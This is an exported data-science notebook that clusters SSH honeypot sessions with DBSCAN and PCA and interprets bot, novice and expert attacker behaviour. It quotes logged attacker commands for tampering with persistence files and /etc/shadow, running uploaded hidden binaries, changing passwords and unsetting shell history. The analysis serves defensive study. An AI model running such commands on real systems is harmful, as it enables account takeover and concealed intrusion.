See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy



In [33]:
X_pca = pca.fit_transform(X_scaled)
# ==========================
# 1.1) ESCALAR PCA SOLO PARA VISUALIZAR
# ==========================
scaler_vis = MinMaxScaler()
X_pca_vis = scaler_vis.fit_transform(X_pca)

# ==========================
# 2) Preparar clusters
# ==========================
clusters = df_reduced_noise_2['cluster'].values
unique_clusters = np.unique(clusters)

# ==========================
# 3) Crear figura interactiva
# ==========================
fig = go.Figure()
colors = ['red', 'blue', 'green', 'black', 'purple', 'brown',
          'pink', 'gray', 'cyan', 'magenta']

for i, cluster in enumerate(unique_clusters):
    if cluster == -1:
        continue
    cluster_mask = clusters == cluster
    label = f"Cluster {cluster}" if cluster != -1 else "Noise"

    fig.add_trace(go.Scatter3d(
        x=X_pca_vis[cluster_mask, 0],
        y=X_pca_vis[cluster_mask, 1],
        z=X_pca_vis[cluster_mask, 2],
        mode='markers',
        marker=dict(
            size=4,
            color=colors[i % len(colors)],
            opacity=0.85
        ),
        name=label
    ))

# ==========================
# 4) Layout
# ==========================
fig.update_layout(
    title="DBSCAN Clusters (PCA 3D Escalado para Visualización)",
    scene=dict(
        xaxis_title='PCA 1 (scaled)',
        yaxis_title='PCA 2 (scaled)',
        zaxis_title='PCA 3 (scaled)'
    ),
    width=800,
    height=600
)


import numpy as np

# ==========================
# 4.1) Añadir rotación automática
# ==========================

def rotate_camera(angle):
    return dict(
        eye=dict(
            x=2*np.cos(angle),
            y=2*np.sin(angle),
            z=0.5
        )
    )

frames = []
angles = np.linspace(0, 2*np.pi, 120)  # 120 pasos para 360°

for angle in angles:
    frames.append(
        go.Frame(layout=dict(scene_camera=rotate_camera(angle)))
    )

fig.frames = frames

fig.update_layout(
    updatemenus=[
        dict(
            type="buttons",
            showactive=False,
            buttons=[
                dict(
                    label="▶ Auto-Rotate",
                    method="animate",
                    args=[
                        None,
                        dict(frame=dict(duration=50, redraw=True),
                             fromcurrent=True,
                             transition=dict(duration=0))
                    ]
                )
            ],
            x=0.1,
            y=0.05
        )
    ]
)


# ==========================
# 5) Mostrar figura
# ==========================
fig.show()


In [34]:
df.loc[df_reduced_noise_2[df_reduced_noise_2['cluster'] == 0].index].head(10)

,num_events,num_commands,session_duration,max_inter_command_time,mean_inter_command_time,std_inter_command_time,command_error_rate,file_transfer_ratio,login_error_rate,reconnaissance_ratio,exploit_ratio,unique_commands_ratio,command_diversity
session_id,,,,,,,,,,,,,
040b0f8fb6c9,106.0,50.0,252.109637,48.238366,5.082035,10.178683,0.0,0.0,0.0,0.028302,0.009434,0.980000,2.0
26b8838e050f,98.0,46.0,192.462199,52.249223,4.188550,8.730391,0.0,0.0,0.0,0.030612,0.010204,0.978261,2.0
2e13308b9568,98.0,46.0,159.335442,47.906913,3.475565,7.763664,0.0,0.0,0.0,0.030612,0.010204,0.978261,2.0
34b1c6f921f7,98.0,46.0,268.606577,55.689528,5.854220,9.403474,0.0,0.0,0.0,0.030612,0.010204,0.978261,2.0
4324a6fc6c9f,98.0,46.0,196.931454,49.256393,4.286031,8.910410,0.0,0.0,0.0,0.030612,0.010204,0.978261,2.0
5b877f5de97f,106.0,50.0,194.262670,52.767977,3.905833,8.324826,0.0,0.0,0.0,0.028302,0.009434,0.980000,2.0
7ccb22f90c03,106.0,50.0,171.499420,49.177281,3.383975,7.660810,0.0,0.0,0.0,0.028302,0.009434,0.980000,2.0
847d868822b4,106.0,50.0,239.137157,59.315278,4.805513,10.572714,0.0,0.0,0.0,0.028302,0.009434,0.980000,2.0
e673fa2bd000,102.0,48.0,244.493299,57.561186,5.134255,10.076835,0.0,0.0,0.0,0.029412,0.009804,0.979167,2.0


In [35]:
dataset_commands.loc['ead0d45c06a5'].head(10)

,message
session_id,
ead0d45c06a5,CMD: LC_ALL=C cat /etc/rc.local /etc/rc.d/rc.l...
ead0d45c06a5,CMD: LC_ALL=C crontab -l
ead0d45c06a5,CMD: scp -t ~/5tmx3d7wjs2i3d9bep51kbi4n4
ead0d45c06a5,CMD: LC_ALL=C ~/5tmx3d7wjs2i3d9bep51kbi4n4
ead0d45c06a5,CMD: LC_ALL=C rm -f ~/5tmx3d7wjs2i3d9bep51kbi4n4
ead0d45c06a5,CMD: LC_ALL=C chattr -i -a ~/.dhpcd
ead0d45c06a5,CMD: LC_ALL=C rm -f ~/.dhpcd
ead0d45c06a5,CMD: LC_ALL=C rmdir ~/.dhpcd
ead0d45c06a5,CMD: scp -t ~/.dhpcd


This bot:

Reads startup & cron files
cat /etc/rc.local, crontab -l
→ Checks persistence locations.

Uploads & runs hidden binaries
scp -t …, ~/8d5qip9lsagwat821wmpzbnmr9, /tmp/knrm, /tmp/r
→ Drops and executes malware payloads in multiple directories.

Removes or alters hidden files
rm -f ~/.dhpcd, chattr -i -a ~/.dhpcd
→ Deletes old payloads or removes protections.

Attempts to change passwords
chattr -i /etc/shadow, passwd test, passwd oracle
→ Tries to take over system accounts.

Installs SSH keys
Creates ~/.ssh and adds attacker’s RSA key
→ Enables backdoor remote access.

Checks open ports
netstat -plnt, ss -tln
→ Looks for services to exploit or hide behind.

Runs top
top -bn1
→ Checks system load before/after running malware.

Cleans traces
rm -f /tmp/...
→ Removes dropped files after execution.

In [36]:
df.loc[df_reduced_noise_2[df_reduced_noise_2['cluster'] == 1].index].head(10)

,num_events,num_commands,session_duration,max_inter_command_time,mean_inter_command_time,std_inter_command_time,command_error_rate,file_transfer_ratio,login_error_rate,reconnaissance_ratio,exploit_ratio,unique_commands_ratio,command_diversity
session_id,,,,,,,,,,,,,
05c9c7c42eaa,10.0,5.0,8.460570,0.994881,0.986471,0.008183,0.0,0.0,0.0,0.2,0.1,0.2,5.0
118c7a78e9c8,10.0,5.0,5.395402,0.610842,0.574433,0.036189,0.0,0.0,0.0,0.2,0.1,0.2,5.0
142e18f39ec0,10.0,5.0,6.396129,0.770664,0.768639,0.002139,0.0,0.0,0.0,0.2,0.1,0.2,5.0
1831c35a761b,10.0,5.0,68.951947,0.904014,0.902112,0.002530,0.0,0.0,0.0,0.2,0.1,0.2,5.0
18837d2a7388,10.0,5.0,7.916485,0.861092,0.781570,0.151831,0.0,0.0,0.0,0.2,0.1,0.2,5.0
20d732015941,10.0,5.0,6.816082,0.911533,0.758104,0.102825,0.0,0.0,0.0,0.2,0.1,0.2,5.0
21371867fe31,10.0,5.0,3.063371,0.380087,0.379431,0.000483,0.0,0.0,0.0,0.2,0.1,0.2,5.0
28c63c69bee4,10.0,5.0,8.966841,0.997417,0.983867,0.010118,0.0,0.0,0.0,0.2,0.1,0.2,5.0
2b6728306d80,10.0,5.0,13.191260,3.768581,1.733975,1.382398,0.0,0.0,0.0,0.2,0.1,0.2,5.0


In [40]:
dataset_commands.loc['05c9c7c42eaa']

,message
session_id,
05c9c7c42eaa,CMD: unset HISTORY HISTFILE HISTSAVE HISTZONE ...
05c9c7c42eaa,CMD: uname
05c9c7c42eaa,CMD: free -m
05c9c7c42eaa,CMD: ps -x
05c9c7c42eaa,CMD: cat /proc/cpuinfo


This bot:

Disables shell history
unset HISTORY HISTFILE …
→ Hides its activity (defense evasion).

Collects system info
uname, free -m, ps -x, cat /proc/cpuinfo
→ Gathers OS, RAM, running processes, and CPU details.

In [37]:
df.loc[df_reduced_noise_2[df_reduced_noise_2['cluster'] == 2].index].head(10)

,num_events,num_commands,session_duration,max_inter_command_time,mean_inter_command_time,std_inter_command_time,command_error_rate,file_transfer_ratio,login_error_rate,reconnaissance_ratio,exploit_ratio,unique_commands_ratio,command_diversity
session_id,,,,,,,,,,,,,
10a0bd5b7d11,9.0,1.0,1.928035,0.0,0.0,0.0,0.0,0.999999,0.0,0.222222,0.222222,0.5,2.0
602e8fc9d248,9.0,1.0,3.222301,0.0,0.0,0.0,0.0,0.999999,0.0,0.222222,0.222222,0.5,2.0
77384dd5f05a,9.0,1.0,1.319250,0.0,0.0,0.0,0.0,0.999999,0.0,0.222222,0.222222,0.5,2.0
880feb6d53bd,9.0,1.0,4.165638,0.0,0.0,0.0,0.0,0.999999,0.0,0.222222,0.222222,0.5,2.0
a763cabc3bd9,9.0,1.0,1.829027,0.0,0.0,0.0,0.0,0.999999,0.0,0.222222,0.222222,0.5,2.0
f0ed684509af,9.0,1.0,2.345778,0.0,0.0,0.0,0.0,0.999999,0.0,0.222222,0.222222,0.5,2.0
0d68abd74d65,9.0,1.0,4.012520,0.0,0.0,0.0,0.0,0.999999,0.0,0.222222,0.222222,0.5,2.0
5d88b8f38a25,9.0,1.0,2.431071,0.0,0.0,0.0,0.0,0.999999,0.0,0.222222,0.222222,0.5,2.0
c40c6a1ed760,9.0,1.0,15.416038,0.0,0.0,0.0,0.0,0.999999,0.0,0.222222,0.222222,0.5,2.0


In [41]:
dataset_commands.loc['10a0bd5b7d11']

message    CMD: uname -a;unset HISTORY HISTFILE HISTSAVE ...
Name: 10a0bd5b7d11, dtype: object

This bot:

Disables shell history
unset HISTORY HISTFILE …
→ Hides its activity (defense evasion).

In [38]:
fig = go.Figure()
colors = ['red', 'blue', 'green', 'black', 'purple', 'brown',
          'pink', 'gray', 'cyan', 'magenta']

for i, cluster in enumerate(unique_clusters):
    if cluster != -1:
        continue
    cluster_mask = clusters == cluster
    label = f"Cluster {cluster}" if cluster != -1 else "Noise"

    fig.add_trace(go.Scatter3d(
        x=X_pca_vis[cluster_mask, 0],
        y=X_pca_vis[cluster_mask, 1],
        z=X_pca_vis[cluster_mask, 2],
        mode='markers',
        marker=dict(
            size=4,
            color=colors[i % len(colors)],
            opacity=0.85
        ),
        name=label
    ))

# ==========================
# 4) Layout
# ==========================
fig.update_layout(
    title="DBSCAN Clusters (PCA 3D Escalado para Visualización)",
    scene=dict(
        xaxis_title='PCA 1 (scaled)',
        yaxis_title='PCA 2 (scaled)',
        zaxis_title='PCA 3 (scaled)'
    ),
    width=800,
    height=600
)


import numpy as np

# ==========================
# 4.1) Añadir rotación automática
# ==========================

def rotate_camera(angle):
    return dict(
        eye=dict(
            x=2*np.cos(angle),
            y=2*np.sin(angle),
            z=0.5
        )
    )

frames = []
angles = np.linspace(0, 2*np.pi, 120)  # 120 pasos para 360°

for angle in angles:
    frames.append(
        go.Frame(layout=dict(scene_camera=rotate_camera(angle)))
    )

fig.frames = frames

fig.update_layout(
    updatemenus=[
        dict(
            type="buttons",
            showactive=False,
            buttons=[
                dict(
                    label="▶ Auto-Rotate",
                    method="animate",
                    args=[
                        None,
                        dict(frame=dict(duration=50, redraw=True),
                             fromcurrent=True,
                             transition=dict(duration=0))
                    ]
                )
            ],
            x=0.1,
            y=0.05
        )
    ]
)


# ==========================
# 5) Mostrar figura
# ==========================
fig.show()

In [39]:
df.loc[df_reduced_noise_2[df_reduced_noise_2['cluster'] == -1].index].head()

,num_events,num_commands,session_duration,max_inter_command_time,mean_inter_command_time,std_inter_command_time,command_error_rate,file_transfer_ratio,login_error_rate,reconnaissance_ratio,exploit_ratio,unique_commands_ratio,command_diversity
session_id,,,,,,,,,,,,,
051da2977a31,41.0,19.0,135.831325,52.700862,5.914595,11.830356,0.000000,0.000000,0.0,0.048780,0.024390,0.558824,16.0
27983da3ac55,74.0,22.0,182.448801,124.406758,8.298288,26.863638,0.090909,0.136364,0.0,0.027027,0.054054,0.555556,17.0
406dee68c2f5,77.0,23.0,173.889699,127.652680,7.469536,26.895480,0.086957,0.173913,0.0,0.025974,0.064935,0.538462,19.0
54e333fda40e,104.0,49.0,698.387200,175.072975,14.294518,32.344171,0.000000,0.000000,0.0,0.028846,0.009615,0.979592,2.0
67d8a4cb5eb4,77.0,23.0,152.099788,113.885212,6.452593,24.054963,0.086957,0.173913,0.0,0.025974,0.064935,0.538462,19.0


These are the noise points from the latest DBSCAN algorithm. These samples are scattered in less dense regions, so they differ more from each other. The reason is that this set contains both outliers and normal users (not bots), resulting in widely varying behaviors.

### Samples of expert hackers

session_id: 051da2977a31

std_inter_command_time = 11.83 s → Moderately irregular. Commands are not executed at a fully constant pace, which is typical of humans who pause to think or review results between actions.

command_diversity = 16 and unique_commands_ratio ≈ 0.56 → Uses many different commands, not repetitive. This indicates system knowledge and the ability to combine different tools, characteristic of an experienced user.

command_error_rate = 0.0 → No errors in command execution, suggesting mastery and precision in using the terminal or system.

session_duration = 135.8 s and num_events = 41 → Steady pace of approximately one command every 3–4 seconds on average, enough time to process information between commands, typical of an active and efficient human.

Varied actions (although no significant file transfers or exploitation) → The diversity of commands and combination of events indicates that the user performs intentional and specific tasks, not a simple automated script.

session_id: 27983da3ac55

std_inter_command_time = 26.86 s → Very irregular, with long and short pauses. This reflects that the user is thinking, reviewing results, or planning commands, behavior typical of a human.

command_diversity = 17 and unique_commands_ratio ≈ 0.56 → High diversity of commands and little repetition. Indicates system mastery and knowledge of multiple tools.

command_error_rate ≈ 9% → Some errors, normal even for experts when performing complex tasks or testing new commands.

file_transfer_ratio ≈ 14% and exploit_ratio ≈ 5% → Performs varied and specific actions, including file transfers and small exploitation or testing commands. This suggests the user is not just executing basic commands, but performing advanced tasks that require expertise.

num_commands = 22 and num_events = 74 → High activity with an efficient and structured pace: enough to process information between commands without being mechanical or repetitive.

### Samples of Script Kiddies

session_id: 60a1c78f32a4

std_inter_command_time ≈ 36 s → Very irregular, with long pauses. This suggests the user is thinking or hesitating between commands, behavior typical of a novice.

command_diversity = 3 and unique_commands_ratio ≈ 0.33 → Very low diversity of commands and high repetition. Indicates limited knowledge of the system and basic usage of available tools.

command_error_rate ≈ 66% → Very high, indicating frequent mistakes while executing commands, typical of someone still learning.

file_transfer_ratio ≈ 33% → Performs some file transfers, but combined with a high error rate, this reflects inexperience.

num_commands = 3 and num_events = 16 → Low overall activity and very few distinct commands, showing limited engagement and experimentation.

session_id: 227750191cbc

std_inter_command_time ≈ 6.85 s → Relatively regular, with short pauses. This suggests the user executes commands at a steady pace, though still showing some hesitation.

command_diversity = 11 and unique_commands_ratio ≈ 0.29 → Low diversity of commands and moderate repetition. Indicates limited knowledge of the system and basic command usage.

command_error_rate ≈ 21% → High, showing frequent mistakes while executing commands, typical of someone still learning or practicing.

file_transfer_ratio = 0 → Performs no file transfers, focusing on simple or basic tasks.

num_commands = 14 and num_events = 31 → Moderate activity with a small set of distinct commands, reflecting experimentation but limited engagement.

### Outlier bots

session_id: 890cb40f9e53

std_inter_command_time ≈ 0.75 s → Very regular and almost constant. This indicates a robotic or mechanical execution pattern, typical of a script or bot.

command_error_rate = 0% → No errors at all, reflecting precise and controlled execution, unlike human behavior.

num_commands = 19 and num_events = 41 → Moderate number of commands and events, executed with extreme consistency.

session_duration ≈ 5049 s (~1.4 hours) → This is why this sample is clustered as noise.

session_id: a1e66dd17777

num_commands = 1 and num_events = 7 → Very low activity, only one command.

session_duration = 2.074665 → Extremely short session.

command_error_rate ≈ 100% → The only command failed. If this were a human, they would probably have tried a different command to succeed, but this behavior suggests a poorly configured bot.